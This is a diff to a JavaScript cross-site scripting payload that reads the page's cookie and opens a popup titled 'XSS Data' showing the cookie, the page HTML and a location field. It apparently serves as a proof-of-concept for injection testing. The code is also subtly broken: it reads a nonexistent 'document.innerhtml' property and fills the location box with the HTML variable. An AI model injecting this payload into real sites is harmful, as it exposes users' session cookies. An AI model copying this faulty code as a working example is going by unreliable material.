@@ -12,8 +12,11 @@ var timeoutlength = 9999000;
 
 //Get Cookie
 var UsersCookie = document.cookie;
+var DocHTML = document.innerhtml;
+var DocLocation = document.location;
 
 
+var TextAreaStyle = "width:100%;height:150px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
 function createPopup(){
 var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
 popup.document.body.style.background = "rgb(53, 53, 53)";
@@ -26,7 +29,7 @@ popup.document.title = "XSS Data";
 //Cookie Doc
 var txtCookie = popup.document.createElement("TEXTAREA");
 txtCookie.innerHTML = UsersCookie;
-txtCookie.style = "width:100%;height:150px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+txtCookie.style = TextAreaStyle
 popup.document.body.appendChild(txtCookie);
 
 //Doc Header
@@ -34,14 +37,22 @@ var hDocumentInner = popup.document.createElement("h4");
 hDocumentInner.style = "color:fff;";
 hDocumentInner.innerHTML = "Document Inneer HTML";
 popup.document.body.appendChild(hDocumentInner);
-
 //Cookie Doc
 var txtDocumentInner = popup.document.createElement("TEXTAREA");
-txtDocumentInner.innerHTML = document.innerhtml;
-txtDocumentInner.style = "width:100%;height:150px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+txtDocumentInner.innerHTML = DocHTML;
+txtDocumentInner.style = TextAreaStyle
 popup.document.body.appendChild(txtDocumentInner);
 
-
+//URL Header
+var hURLInner = popup.document.createElement("h4");
+hURLInner.style = "color:fff;";
+hURLInner.innerHTML = "Document Location";
+popup.document.body.appendChild(hURLInner);
+//URL Doc
+var txtURLInner = popup.document.createElement("TEXTAREA");
+txtURLInner.innerHTML = DocHTML;
+txtURLInner.style = "width:100%;height:20px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+popup.document.body.appendChild(txtURLInner);
 
 }
 createPopup();
